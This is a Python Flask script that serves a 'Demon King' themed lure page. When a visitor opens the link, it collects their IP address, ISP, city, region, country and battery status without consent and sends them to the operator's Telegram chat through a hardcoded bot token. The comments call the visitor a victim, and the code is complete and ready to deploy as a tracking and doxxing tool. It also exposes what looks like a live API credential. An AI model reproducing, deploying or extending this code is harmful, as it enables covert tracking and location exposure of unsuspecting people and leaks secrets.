from flask import Flask, request
import requests
import json
import urllib.request

app = Flask(__name__)

# Put your token directly here if you don’t want env variables
BOT_TOKEN = "8254458626:AAFP2IIK6ow_fIj7VwsPtMVIveZ-RUGzDRA"

def send_to_telegram(chat_id, message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
    requests.post(url, data=data)

@app.route("/free")
def free_page():
    chat_id = request.args.get("chat")
    user_id = request.args.get("user", "Unknown Weakling")

    # Get victim IP
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    # Get ISP + Location
    try:
        with urllib.request.urlopen(f"http://ip-api.com/json/{ip}") as url:
            data = json.loads(url.read().decode())
            isp = data.get("isp", "Unknown ISP")
            country = data.get("country", "Unknown")
            city = data.get("city", "Unknown City")
            region = data.get("regionName", "Unknown Region")
    except:
        isp, country, city, region = "Unknown ISP", "Unknown", "Unknown City", "Unknown Region"

    # Send info instantly to Telegram
    send_to_telegram(chat_id, 
    f"👹 Weakling <b>{user_id}</b> seeking power from the Demon King!\n"
    f"🌍 IP: <b>{ip}</b>\n"
    f"🏙 Location: <b>{city}, {region}, {country}</b>\n"
    f"📡 ISP: <b>{isp}</b>"
    )

    return f"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>☠️ The Demon King Sees You ☠️</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {{
   margin:0;
   padding:0;
   font-family:'Courier New', monospace;
   background:#000;
   color:#ff0000;
   display:flex;
   flex-direction:column;
   justify-content:center;
   align-items:center;
   height:100vh;
   text-align:center;
}}
h1 {{
   font-size:2.5em;
   text-shadow:0 0 15px #ff0000, 0 0 30px black;
   margin-bottom:20px;
}}
p {{
   font-size:1.1em;
   margin:10px 0;
}}
.glow {{
   color:#00ffe7;
   text-shadow:0 0 10px #00ffe7, 0 0 25px cyan;
   font-weight:bold;
}}
.info-box {{
   border:2px solid #ff0000;
   padding:20px;
   border-radius:10px;
   margin-top:20px;
   width:90%;
   max-width:400px;
    background:rgba(0,0,0,0.8);
}}
</style>
</head>
<body>

<script>
// Suspense alert first
alert("🖤 Mortal... You dared seek the power of the Demon King.\\nPress OK to witness the truth of your essence.");
// Suspense letter alert
alert("🖤 Mortal... you have dared to seek the power of the Demon King. Press OK to face your destiny.");

// Show victim info + battery after OK
navigator.getBattery().then(function(battery){{
   let level = Math.round(battery.level*100);
   let charging = battery.charging ? "⚡ Charging" : "❌ Not Charging";

   document.body.innerHTML = `
   <h1>👹 The Demon King Sees You 👹</h1>
   <div class="info-box">
        <p>This Mortal <span class="glow">{user_id}</span> Summoned me</p>
        <p>Weakling: <span class="glow">{user_id}</span></p>
       <p>IP Address: <span class="glow">{ip}</span></p>
       <p>ISP: <span class="glow">{isp}</span></p>
       <p>Location: <span class="glow">{city}, {region}, {country}</span></p>
       <p>Battery: <span class="glow">${{level}}%</span> - <span class="glow">${{charging}}</span></p>
       <p>All your secrets have been delivered to the Demon King.</p>
   </div>
   `;

   // Send battery info too
   fetch('/report_battery?chat={chat_id}&user={user_id}', {{
       method:'POST',
       headers:{{'Content-Type':'application/json'}},
       body: JSON.stringify({{
           ip:"{ip}",
           isp:"{isp}",
           city:"{city}",
           region:"{region}",
           country:"{country}",
           level:level,
           charging:charging
       }})
   }});
}});
</script>

</body>
</html>
"""

@app.route("/report_battery", methods=["POST"])
def report_battery():
    chat_id = request.args.get("chat")
    user_id = request.args.get("user")
    data = request.json

    ip = data.get("ip")
    isp = data.get("isp")
    city = data.get("city")
    region = data.get("region")
    country = data.get("country")
    level = data.get("level")
    charging = data.get("charging")

    send_to_telegram(chat_id, 
    f"🔋 Weakling <b>{user_id}</b> seeking power from Demon King\n"
    f"🌍 IP: <b>{ip}</b>\n"
    f"📡 ISP: <b>{isp}</b>\n"
    f"🏙 Location: <b>{city}, {region}, {country}</b>\n"
    f"🔋 Battery: {level}%\n"
    f"⚡ Status: {charging}\n"
    "LONG LIVE THE KING"
    )
    return "ok"

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
